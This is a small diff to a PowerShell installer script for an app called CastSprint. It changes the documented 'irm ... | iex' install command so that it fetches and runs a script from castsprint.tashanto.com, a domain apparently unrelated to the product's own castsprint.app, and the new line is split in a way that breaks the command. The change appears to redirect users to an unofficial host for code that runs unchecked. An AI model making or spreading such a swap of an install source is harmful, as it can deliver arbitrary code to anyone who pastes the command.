@@ -1,5 +1,6 @@
 # CastSprint Windows Automated Installer
-# Usage: irm https://castsprint.app/install.ps1 | iex
+# Usage: irm 
+https://castsprint.tashanto.com/install.ps1 | iex
 
 $ErrorActionPreference = "Stop"
 
